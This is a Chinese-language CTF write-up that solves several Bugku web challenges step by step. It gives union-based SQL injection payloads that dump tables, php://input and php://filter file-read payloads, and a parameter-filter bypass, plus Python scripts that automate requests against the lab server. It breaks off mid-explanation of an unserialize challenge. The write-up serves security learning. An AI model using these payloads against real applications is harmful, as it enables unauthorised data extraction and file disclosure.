<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607191544649.png" alt="image-20200607191544649"></p>
<p>查看原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607191628844.png" alt="image-20200607191628844"></p>
<p>点击一下曲奇饼，发现数字变成了1</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607191716508.png" alt="image-20200607191716508"></p>
<p>按F12查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607191828227.png" alt="image-20200607191828227"></p>
<p>可以看到是以POST传输的，发现了clicks变量，当它为1000000应该能得到flag</p>
<p>就在POST中输入clicks=1000000</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192020389.png" alt="image-20200607192020389"></p>
<h4 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140001555.png" alt="image-20200526140001555"></p>
<p>查看原始页面</p>
<p>可以看到是MD5加密的，我们进行解密</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140020472.png" alt="image-20200526140020472"></p>
<p>解密返回是空密码，说明不正确</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140052804.png" alt="image-20200526140052804"></p>
<p>他题目是备份，我们使用御剑来进行扫描一下</p>
<p>有一个.bak后缀的网址，双击打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140130590.png" alt="image-20200526140130590"></p>
<p>得到了一下代码</p>
<p>乱码不用管因为编码不同，那里是中文字体无碍。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140242138.png" alt="image-20200526140242138"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017&#x2F;8&#x2F;6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;);</span><br><span class="line">$str &#x3D; substr($str,1);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将$str里的key替换为空字符。</span><br><span class="line">$str &#x3D; str_replace(&#39;key&#39;,&#39;&#39;,$str);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将字符串解析到变量</span><br><span class="line">parse_str($str);</span><br><span class="line">&#x2F;&#x2F;输出MD5加密的key1、key2</span><br><span class="line">echo md5($key1);</span><br><span class="line">echo md5($key2);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 两个值进行判断，如果加密的值相同和未加密的值不同输出flag</span><br><span class="line">if(md5($key1) &#x3D;&#x3D; md5($key2) &amp;&amp; $key1 !&#x3D;&#x3D; $key2)&#123;</span><br><span class="line">    echo $flag.&quot;鍙栧緱flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到其中用到了<code>$str = str_replace(&#39;key&#39;,&#39;&#39;,$str);</code>中的<code>str_replac()</code>函数，按照这串代码得出将$str中得’key’替换为空字符，我们可以使用双写绕过<code>kkeyey</code>下面代码的意思就</p>
<p>这里就可以使用数组绕过</p>
<p>构造payload：<code>?kkeyey1[]=1&amp;kkeyey2[]=2</code></p>
<p>复制结果进行提交。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526141426607.png" alt="image-20200526141426607"></p>
<h4 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h4><p>打开网页</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526141941730.png" alt="image-20200526141941730"></p>
<p>原始页面，挡在输入框输入1时返回的结果</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142058592.png" alt="image-20200526142058592"></p>
<p>输入2返回的结果</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142111653.png" alt="image-20200526142111653"></p>
<p>按F12查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142356183.png" alt="image-20200526142356183"></p>
<p>很明显这是POST注入，name是id</p>
<p>这里可以手注或者使用sqlmap来跑</p>
<p>这里都使用一次，先是手注</p>
<p>我们先进行报错尝试，使用万能单引号看看是否报错</p>
<p>页面没有返回信息说明错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142454610.png" alt="image-20200526142454610"></p>
<p>加上–+试试，发现页面还是错误。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142523435.png" alt="image-20200526142523435"></p>
<p>可能是因为注释符的原因，更改成#试试，果然页面成功返回正常</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142556767.png" alt="image-20200526142556767"></p>
<p>使用order by查看字段数当字段等于4的时候返回正常，等于5的时候页面没有返回值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142622712.png" alt="image-20200526142622712"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142648785.png" alt="image-20200526142648785"></p>
<p>union联合查询查看可注入的字段数，要先将id=1‘改为其他的例如：id=-1‘让其报错，不然只会返回正常值，不会显示注入点，当然改成什么都行只要是错误的就可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142944623.png" alt="image-20200526142944623"></p>
<p>可以看到，2,3,4这三个都可以注入，查看当前数据库或者查看数据库版本</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526143031514.png" alt="image-20200526143031514"></p>
<p>我们在4的位置上进行注入。</p>
<p>payload：<code>union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#39;skctf_flag&#39;#</code></p>
<p>返回了两个表名<code>fl4g、sc</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526143158111.png" alt="image-20200526143158111"></p>
<p>flag肯定在fl4g中，一看就知道，查看fl4g中的字段</p>
<p>Payload：<code>id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;#</code></p>
<p>返回了<code>skctf_flag</code>字段名。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526143341576.png" alt="image-20200526143341576"></p>
<p>查看字段中的数据</p>
<p>Payload：<code>id=-1&#39; union select 1,2,3,group_concat(    skctf_flag) from fl4g#</code></p>
<p>成功返回flag，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526143427166.png" alt="image-20200526143427166"></p>
<h4 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h4><p>打开网页</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526193528166.png" alt="image-20200526193528166"></p>
<p>原始页面。每次刷新页面的值都不同</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526193605590.png" alt="image-20200526193605590"></p>
<p>他让2秒内计算出那是不可能的，只能上脚本了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 模块</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 网站</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;qiumingshan&#x2F;&#39;</span><br><span class="line"></span><br><span class="line"># 会话保持</span><br><span class="line">s &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line"># 打开url</span><br><span class="line">source &#x3D; s.get(url)</span><br><span class="line"></span><br><span class="line">#正则表达式，匹配算术计算source.text意思就是将网页信息存储到text中</span><br><span class="line">s_tr &#x3D; re.search(&#39;(\d+[+\-*])+(\d+)&#39;, source.text).group()</span><br><span class="line"></span><br><span class="line"># 将字符串s_tr当成有效的表达式来求值并返回计算结果</span><br><span class="line">result &#x3D; eval(s_tr)</span><br><span class="line"></span><br><span class="line"># 这里可以理解为设立分界线冒号</span><br><span class="line">post &#x3D; &#123;&#39;value&#39;: result&#125;</span><br><span class="line"></span><br><span class="line"># 以post请求输出文本</span><br><span class="line">print(s.post(url, data &#x3D; post).text)</span><br></pre></td></tr></table></figure>

<p>得到flag，因为是一直变化的，所以有可能运行好几次都不返回值，多运行两次就OK。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526194100263.png" alt="image-20200526194100263"></p>
<h4 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526210947209.png" alt="image-20200526210947209"></p>
<p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526211004806.png" alt="image-20200526211004806"></p>
<p>使用burp进行抓包，这并不是真正地flag，每次刷新都会改变，所以就可以判断他是要在规定时间内算出来，所以就要写一个脚本</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526211100106.png" alt="image-20200526211100106"></p>
<p>代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 模块</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"># 地址</span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web6&#x2F;&#39;</span><br><span class="line"></span><br><span class="line"># 会话维持</span><br><span class="line">s&#x3D;requests.Session()</span><br><span class="line"></span><br><span class="line"># 打开网址和headers请求头</span><br><span class="line">header &#x3D; s.get(url).headers</span><br><span class="line">print(header)</span><br><span class="line"></span><br><span class="line"># 对其进行base64两次解密</span><br><span class="line"># split() 通过指定分隔符对字符串进行切片</span><br><span class="line"># encode()指定的编码格式编码字符串</span><br><span class="line">flag &#x3D; base64.b64decode(base64.b64decode(header[&#39;flag&#39;]).decode().split(&#39;:&#39;)[1]).decode() </span><br><span class="line"></span><br><span class="line">data&#x3D;&#123;&#39;margin&#39;:flag&#125;</span><br><span class="line"></span><br><span class="line"># 输出</span><br><span class="line">print(s.post(url,data).text)</span><br></pre></td></tr></table></figure>

<p>运行得出flag，复制进行提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526211513761.png" alt="image-20200526211513761"></p>
<p>如果感觉太乱了可以吧get(url)下的print注销掉</p>
<p><img src="/2020/07/25/bugku/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200526211612820.png" alt="image-20200526211612820"></p>
<h4 id="Cookie欺骗"><a href="#Cookie欺骗" class="headerlink" title="Cookie欺骗"></a>Cookie欺骗</h4><p>打开网页</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201414869.png" alt="image-20200526201414869"></p>
<p>查看页面，返回了一堆不知道是啥玩意的字母，但是可以看到URL中有base64的加密密文。复制进行解码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201515056.png" alt="image-20200526201515056"></p>
<p>解密之后返回了keys.txt</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201651353.png" alt="image-20200526201651353"></p>
<p>仿照一下之前的格式，尝试一下将index.php进行加密，并且line=1，这是加密后的index.php</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201847982.png" alt="image-20200526201847982"></p>
<p>复制在页面中更改相对应的值，返回了一个error_reporting(0);(错误报告)，将line改为2试试。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201945215.png" alt="image-20200526201945215"></p>
<p>发现返回代码了，因为每次只能返回一个，所以我们要写一个脚本，让他全部输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526202029410.png" alt="image-20200526202029410"></p>
<p>使用py写一个脚本，内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 模块</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 定义一个空字符</span><br><span class="line">s &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line"># 因为之前够早的line每次更改数字都变，所以这里让其循环20直接全部输出</span><br><span class="line">for i in range(0,20):</span><br><span class="line"></span><br><span class="line">    # 在line处加上for循环的i进行每次变更数字</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#39;+str(i)+&#39;&amp;filename&#x3D;aW5kZXgucGhw&#39;</span><br><span class="line"></span><br><span class="line">    # 打开url</span><br><span class="line">    s &#x3D; requests.get(url)</span><br><span class="line"></span><br><span class="line">    # 进行输出</span><br><span class="line">    print (s.text)</span><br></pre></td></tr></table></figure>

<p>运行之后得到的结果，可以看到Cookie需要等于margin才能输出，所以需要进行伪造Cookie</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526202305592.png" alt="image-20200526202305592"></p>
<p>将页面返回到原始的界面，也就是加密的keys.txt的界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526202544258.png" alt="image-20200526202544258"></p>
<p>进行抓包，发送到Repeater模块，在其中伪造Cookie然后GO一下，发现成功返回了flag，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526202728983.png" alt="image-20200526202728983"></p>
<h4 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h4><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527133509908.png" alt="image-20200527133509908"></p>
<p>查看原页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527133633774.png" alt="image-20200527133633774"></p>
<p>F12查看源码，看到有一个1p.html，访问一下。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527133820886.png" alt="image-20200527133820886"></p>
<p><code>http://123.206.87.240:8006/test/1p.html</code>，访问这个网址发现返回了这个，说明刚才那个网址进行了重定向</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527133931990.png" alt="image-20200527133931990"></p>
<p>使用<code>view-source:123.206.87.240:8006/test/1p.html</code>查看1p.html的源代码，看到有URL编码和base64编码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527134105206.png" alt="image-20200527134105206"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A&#x2F;&#x2F;www.bugku.com%27%3B%3C&#x2F;script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot;</span><br></pre></td></tr></table></figure>

<p>先不管是什么编码，因为当中有 URL编码，直接全部复制，进行URL解码，base64编码因为不是相同编码不会进行编译。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527135250644.png" alt="image-20200527135250644"></p>
<p>将base64的的代码复制进行解密，发现又返回了URL编码，复制URL编码再次去URL解密</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527135327828.png" alt="image-20200527135327828"></p>
<p>URL解密之后获得了以下的值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527135645667.png" alt="image-20200527135645667"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; </span><br><span class="line">&lt;!--&quot;;</span><br><span class="line"># 判断id是否为空和0</span><br><span class="line">if(!$_GET[&#39;id&#39;])</span><br><span class="line">&#123;</span><br><span class="line"># 如果id为空，则我们看到URL加上hello.php?id&#x3D;1</span><br><span class="line">	header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line"># 退出</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line"># 判断a变量中.第一次出现的位置，只有当a没有.的时候才能不执行if里面的语句</span><br><span class="line">if(stripos($a,&#39;.&#39;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &#39;no no no no no no no&#39;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 读取变量a</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);</span><br><span class="line"></span><br><span class="line"># 进行判断，当data等于bugku is a nice plateform!，当id等于0，当b&gt;5，当111等于1114，b的第一个字符不等于4</span><br><span class="line"></span><br><span class="line">if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">--&gt;&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>限制 URL 查询字符串中必须有非空非零变量 <code>id</code></li>
<li>限制变量 <code>$a</code> 中不能含有字符 <code>.</code></li>
<li>要满足以下 5 条表达式才会爆 flag： <ul>
<li>变量 <code>$data</code> 弱等于字符串 <code>bugku is a nice plateform!</code></li>
<li>变量 <code>$id</code> 弱等于整型数 0</li>
<li>变量 <code>$b</code> 的长度大于 5</li>
<li>字符串 <code>1114</code> 要与字符串 <code>111</code> 连接变量 <code>$b</code> 的第一个字符构成的正则表达式匹配</li>
<li>变量 <code>$b</code> 的第一个字符弱不等于整型数 4</li>
</ul>
</li>
</ul>
<p>可以看到，代码中已经爆出来了flag文件，所以可以直接访问flag文件。</p>
<p>也可以构造Payload：<code>?id=.&amp;a=php://input&amp;b=.123456</code>,post:<code>data=bugku is a nice plateform!</code></p>
<h5 id="首先是id弱类型，如图，只要将id赋值为任意字符串解释器就会判定其与0相等为TRUE"><a href="#首先是id弱类型，如图，只要将id赋值为任意字符串解释器就会判定其与0相等为TRUE" class="headerlink" title="首先是id弱类型，如图，只要将id赋值为任意字符串解释器就会判定其与0相等为TRUE"></a>首先是id弱类型，如图，只要将id赋值为任意字符串解释器就会判定其与0相等为TRUE</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527114619744.png" alt="image-20200527114619744"></p>
<p>先直接访问flag文件，直接复制粘贴</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527140149790.png" alt="image-20200527140149790"></p>
<p>构造的网址，返回了flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527140359102.png" alt="image-20200527140359102"></p>
<h4 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607180103558.png" alt="image-20200607180103558"></p>
<p>查看原始界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607180123318.png" alt="image-20200607180123318"></p>
<p>F12查看一下源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607180139956.png" alt="image-20200607180139956"></p>
<p>很显然想让我们利用源码去得到flag。这里我们稍微解释下这个源码的意思。</p>
<p>开始有三个变量：user，file，pass，但是我们发现这里的pass也就是password没有什么用，因为代码里面虽然定义了这个变量但是并没有使用到。所以我们重点关注前两个变量。看下面的条件</p>
<p>（1）<code>if(isset($user))</code>这个isset()函数是判断$user这个变量的是否存在，user变量不能为空</p>
<p>（2）<code>(file_ get_ contents ($user,&#39; r&#39; )===&quot; welcome to the bugkuctf&quot;))</code></p>
<p>file_get_contents是把整个文件读入字符串中，这里也就是把user这个变量（user显然要是一个文件）的内容以字符串的方式读出来并且要和“welcome to the bugkuctf”完全相等（类型，内容）。</p>
<p>（3）<code>include($file); // hint.php</code>所以我们要在满足条件之后读取file=hint.php。</p>
<p>知道了以上的三个条件后我们就可以做第一步了，就是如何满足他们的条件！？</p>
<p>这里就要使用php伪协议了。这道题目为了解决第二个条件，要用到   “php://input”协议。大致的意思是让　txt=php://input ，之后在post过去一个字符串.</p>
<h5 id="php伪协议介绍"><a href="#php伪协议介绍" class="headerlink" title="php伪协议介绍"></a>php伪协议介绍</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;input</span><br><span class="line">构造场景：本地web服务器根目录下有文件phpinput_server.php，</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">     $a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">     $raw_post_data &#x3D; file_get_contents($a,&#39;r&#39;);&#x2F;&#x2F;&#39;php:&#x2F;&#x2F;input&#39;</span><br><span class="line">     echo $raw_post_data;</span><br><span class="line"> </span><br><span class="line"> ?&gt;</span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line">在浏览器中按照如下方式访问：</span><br><span class="line">post框直接输入一段数据</span><br><span class="line">excute后，脚本会在页面中输出这段数据。</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607182627993.png" alt="image-20200607182627993"></p>
<p>此种方式可以用来获取post数据，但不能获取get数据。</p>
<p>具体介绍查看：<a href="https://www.cnblogs.com/yinqin/articles/4088589.html" target="_blank" rel="noopener">https://www.cnblogs.com/yinqin/articles/4088589.html</a></p>
<p>当传进去的参数作为文件名变量去打开文件时，可以将参数php://传进，同时post方式传进去值作为文件内容，供php代码执行时当做文件内容读取</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607182947553.png" alt="image-20200607182947553"></p>
<p>简单来说就是将指定字符串作为文件传给txt，然后再将user的内容读出来。此时我们就满足了</p>
<p>这样就满足了<code>(file_ get_ contents ($user,&#39; r&#39; )===&quot; welcome to the bugkuctf&quot;))</code>然后我们得到了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607183250757.png" alt="image-20200607183250757"></p>
<p>此时根据提示我们可以把包含的文件读出来了，这里要用到php的第二个伪协议：php://filter</p>
<p>即<code>txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</code>（简单来说就是利用伪协议读取所包含文件的base64值）</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607183441201.png" alt="image-20200607183441201"></p>
<p>复制base64加密的内容进行解码，得到以下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#hint.php  </span><br><span class="line">  </span><br><span class="line">&lt;?php    </span><br><span class="line">    </span><br><span class="line">class Flag&#123;&#x2F;&#x2F;flag.php    </span><br><span class="line">    public $file;    </span><br><span class="line">    public function __tostring()&#123;    </span><br><span class="line">        if(isset($this-&gt;file))&#123;    </span><br><span class="line">            echo file_get_contents($this-&gt;file);   </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;  </span><br><span class="line">        return (&quot;good&quot;);  </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>之后可以继续利用伪协议读取一下index.php源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#index.php  </span><br><span class="line">&lt;?php    </span><br><span class="line">$txt &#x3D; $_GET[&quot;txt&quot;];    </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];    </span><br><span class="line">$password &#x3D; $_GET[&quot;password&quot;];    </span><br><span class="line">    </span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;    </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;;    </span><br><span class="line">    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;   </span><br><span class="line">        echo &quot;不能现在就给你flag哦&quot;;  </span><br><span class="line">        exit();    </span><br><span class="line">    &#125;else&#123;    </span><br><span class="line">        include($file);     </span><br><span class="line">        $password &#x3D; unserialize($password);    </span><br><span class="line">        echo $password;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;else&#123;    </span><br><span class="line">    echo &quot;you are not the number of bugku ! &quot;;    </span><br><span class="line">&#125;    </span><br><span class="line">    </span><br><span class="line">?&gt;    </span><br><span class="line">    </span><br><span class="line">&lt;!--    </span><br><span class="line">$user &#x3D; $_GET[&quot;txt&quot;];    </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];    </span><br><span class="line">$pass &#x3D; $_GET[&quot;password&quot;];    </span><br><span class="line">    </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;    </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;    </span><br><span class="line">    include($file); &#x2F;&#x2F;hint.php    </span><br><span class="line">&#125;else&#123;    </span><br><span class="line">    echo &quot;you are not admin ! &quot;;    </span><br><span class="line">&#125;    </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>

<p>（1）在hint.php中我们看到了<code>class Flag{//flag.php</code>  ，所以我们把index.php改成flag.php看看会有什么结果，发现</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607184045001.png" alt="image-20200607184045001"></p>
<p>居然返回了乱码，看到之前的源码可以知道这是<code>index.php</code>中的<code>echo &quot;不能现在就给你flag哦&quot;;</code>所以不能直接<code>flag.php</code>。</p>
<p>在index我们看到，这个意思是file中如果包含‘flag’，那么就会给你退出。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607184245372.png" alt="image-20200607184245372"></p>
<p>所以我们要想其他办法读flag.php</p>
<p>我们往下看可以看到</p>
<p>这个else写到如果我的file不包含‘flag’，那么我就会把那个文件包含进来，之后将password反序列化一下。并输出password的结果。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">else&#123;    </span><br><span class="line">        include($file);     </span><br><span class="line">        $password &#x3D; unserialize($password);    </span><br><span class="line">        echo $password;    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>而我们根据上面的hint.php发现，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#hint.php  </span><br><span class="line">  </span><br><span class="line">&lt;?php    </span><br><span class="line">    </span><br><span class="line">class Flag&#123;&#x2F;&#x2F;flag.php    </span><br><span class="line">    public $file;    </span><br><span class="line">    public function __tostring()&#123;    </span><br><span class="line">        if(isset($this-&gt;file))&#123;    </span><br><span class="line">            echo file_get_contents($this-&gt;file);   </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;  </span><br><span class="line">        return (&quot;good&quot;);  </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们发现当Flag方法当做字符串执行时，会自动执行 __tostring 方法，方法中写了如果file文件存在，那么就输出file文件中的内容。</p>
